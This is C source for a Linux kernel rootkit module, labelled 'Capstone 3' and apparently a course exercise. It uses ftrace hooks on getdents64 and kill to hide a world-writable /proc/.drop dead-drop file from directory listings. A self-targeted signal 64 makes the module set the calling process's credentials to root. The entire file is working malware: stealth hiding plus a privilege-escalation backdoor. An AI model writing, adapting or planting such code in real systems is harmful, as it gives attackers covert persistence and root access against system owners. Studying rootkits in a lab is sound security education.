// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#define HIDDEN_NAME ".drop"
#define SIG_REVEAL  63
#define SIG_HIDE    64

static struct proc_dir_entry *drop_entry;
static char drop_msg[256];
static bool visible;

// resolve symbols via kprobe
static unsigned long kaddr(const char *name)
{
	struct kprobe kp = { .symbol_name = name };
	unsigned long addr;

	if (register_kprobe(&kp))
		return 0;
	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

// --- proc read/write for the dead drop ---

static ssize_t drop_read(struct file *f, char __user *buf,
			   size_t count, loff_t *pos)
{
	if (!visible)
		return -EACCES;
	return simple_read_from_buffer(buf, count, pos,
				       drop_msg, strlen(drop_msg));
}

static ssize_t drop_write(struct file *f, const char __user *buf,
			    size_t count, loff_t *pos)
{
	size_t len;

	if (!visible)
		return -EACCES;
	len = count < sizeof(drop_msg) - 1 ? count : sizeof(drop_msg) - 1;
	if (copy_from_user(drop_msg, buf, len))
		return -EFAULT;
	if (len > 0 && drop_msg[len - 1] == '\n')
		len--;
	drop_msg[len] = '\0';
	return count;
}

static const struct proc_ops drop_proc_ops = {
	.proc_read  = drop_read,
	.proc_write = drop_write,
};

// --- getdents64 hook: hide .drop from /proc listings ---

typedef long (*getdents64_t)(const struct pt_regs *);
static getdents64_t orig_getdents64;
static struct ftrace_ops gd_ops;
static long hook_getdents64(const struct pt_regs *regs);

static void notrace gd_callback(unsigned long ip, unsigned long parent_ip,
				 struct ftrace_ops *ops,
				 struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);

	if (regs)
		regs->ip = (unsigned long)hook_getdents64;
}

static long hook_getdents64(const struct pt_regs *regs)
{
	long ret;
	struct linux_dirent64 __user *dirp;
	struct linux_dirent64 *cur;
	char *kbuf;
	long off;

	ret = orig_getdents64(regs);
	if (ret <= 0)
		return ret;

	dirp = (struct linux_dirent64 __user *)regs->si;
	kbuf = kmalloc(ret, GFP_KERNEL);
	if (!kbuf)
		return ret;
	if (copy_from_user(kbuf, dirp, ret)) {
		kfree(kbuf);
		return ret;
	}

	off = 0;
	while (off < ret) {
		cur = (struct linux_dirent64 *)(kbuf + off);
		if (strcmp(cur->d_name, HIDDEN_NAME) == 0) {
			long remaining = ret - off - cur->d_reclen;
			if (remaining > 0)
				memmove(kbuf + off, kbuf + off + cur->d_reclen,
					remaining);
			ret -= cur->d_reclen;
			continue;
		}
		off += cur->d_reclen;
	}

	if (copy_to_user(dirp, kbuf, ret))
		;
	kfree(kbuf);
	return ret;
}

// --- kill hook: intercept signals 63/64 ---

typedef long (*kill_t)(const struct pt_regs *);
static kill_t orig_kill;
static struct ftrace_ops kill_ops;
static long hook_kill(const struct pt_regs *regs);

static void notrace kill_callback(unsigned long ip, unsigned long parent_ip,
				   struct ftrace_ops *ops,
				   struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);

	if (regs)
		regs->ip = (unsigned long)hook_kill;
}

static long hook_kill(const struct pt_regs *regs)
{
	int sig = (int)regs->si;
	pid_t target = (pid_t)regs->di;

	if (target == current->pid) {
		if (sig == SIG_REVEAL) {
			visible = true;
			pr_info("rk: dead drop revealed\n");
			return 0;
		}
		if (sig == SIG_HIDE) {
			struct cred *cred;

			visible = false;
			cred = prepare_creds();
			if (cred) {
				cred->uid.val = 0;
				cred->gid.val = 0;
				cred->euid.val = 0;
				cred->egid.val = 0;
				commit_creds(cred);
			}
			pr_info("rk: dead drop hidden, caller escalated\n");
			return 0;
		}
	}
	return orig_kill(regs);
}

// --- ftrace setup helpers ---

static int install_hook(unsigned long addr, void *new_func,
			struct ftrace_ops *ops,
			void (*cb)(unsigned long, unsigned long,
				   struct ftrace_ops *, struct ftrace_regs *))
{
	int err;

	ops->func = cb;
	ops->flags = FTRACE_OPS_FL_SAVE_REGS |
		     FTRACE_OPS_FL_IPMODIFY |
		     FTRACE_OPS_FL_RECURSION;

	err = ftrace_set_filter_ip(ops, addr, 0, 0);
	if (err)
		return err;
	return register_ftrace_function(ops);
}

static int __init deaddrop_init(void)
{
	unsigned long gd_addr, kill_addr;
	int err;

	gd_addr = kaddr("__x64_sys_getdents64");
	kill_addr = kaddr("__x64_sys_kill");
	if (!gd_addr || !kill_addr) {
		pr_err("rk: symbol lookup failed\n");
		return -ENOENT;
	}

	orig_getdents64 = (getdents64_t)gd_addr;
	orig_kill = (kill_t)kill_addr;

	drop_entry = proc_create(HIDDEN_NAME, 0666, NULL, &drop_proc_ops);
	if (!drop_entry)
		return -ENOMEM;

	err = install_hook(gd_addr, hook_getdents64, &gd_ops, gd_callback);
	if (err) {
		proc_remove(drop_entry);
		return err;
	}

	err = install_hook(kill_addr, hook_kill, &kill_ops, kill_callback);
	if (err) {
		unregister_ftrace_function(&gd_ops);
		proc_remove(drop_entry);
		return err;
	}

	visible = false;
	memset(drop_msg, 0, sizeof(drop_msg));
	pr_info("rk: dead drop installed at /proc/%s\n", HIDDEN_NAME);
	return 0;
}

static void __exit deaddrop_exit(void)
{
	unregister_ftrace_function(&kill_ops);
	unregister_ftrace_function(&gd_ops);
	proc_remove(drop_entry);
	pr_info("rk: dead drop removed\n");
}

module_init(deaddrop_init);
module_exit(deaddrop_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Capstone 3: hidden proc dead drop with signal control");
